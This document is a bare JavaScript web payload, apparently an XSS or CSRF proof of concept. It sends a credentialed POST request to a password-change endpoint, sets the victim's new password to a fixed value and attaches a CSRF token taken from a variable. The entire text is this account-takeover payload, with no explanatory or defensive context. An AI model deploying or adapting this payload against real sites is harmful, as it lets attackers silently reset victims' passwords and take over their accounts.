var xhr = new XMLHttpRequest();
xhr.open("POST", "https://example.com"+param+"/password", true);
xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
xhr.withCredentials = true;
var body = "setNewPassword_first=passwordQ!&setNewPassword_second=passwordQ!&setNewPassword%5Bcreate%5D=&setNewPassword%5B_token%5D="+csrf;
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));
